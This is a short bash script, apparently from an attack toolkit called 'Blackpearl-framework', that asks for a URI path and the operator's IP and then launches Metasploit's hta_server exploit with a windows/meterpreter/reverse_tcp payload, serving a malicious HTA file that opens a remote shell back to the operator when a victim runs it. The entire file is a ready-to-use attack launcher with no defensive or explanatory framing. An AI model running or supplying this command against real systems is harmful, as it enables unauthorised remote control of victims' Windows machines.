#!/bin/bash
echo 'Uripath: (/)'
read u
read -p $c"Your Ip" ip
msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"
echo
echo $c
read -p "Press enter to go back", enter
cd Blackpearl-framework/lib
python msf.py
